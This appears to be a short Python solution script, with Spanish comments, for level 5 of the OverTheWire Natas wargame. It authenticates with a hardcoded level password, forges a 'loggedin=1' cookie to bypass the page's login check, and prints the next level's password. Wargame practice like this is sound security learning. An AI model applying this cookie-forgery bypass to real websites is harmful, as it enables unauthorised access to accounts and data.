import requests

url = "http://natas5.natas.labs.overthewire.org/"

# Creamos la sesión con requests

s = requests.Session()

#Hacemos la autenticación en el sitio

s.auth = ('natas5', 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')

COOKIES = dict(loggedin='1')

r = s.get(url, cookies=COOKIES)

for x in r.iter_lines():
    if "password" in x.decode('utf-8'):
        print(x)

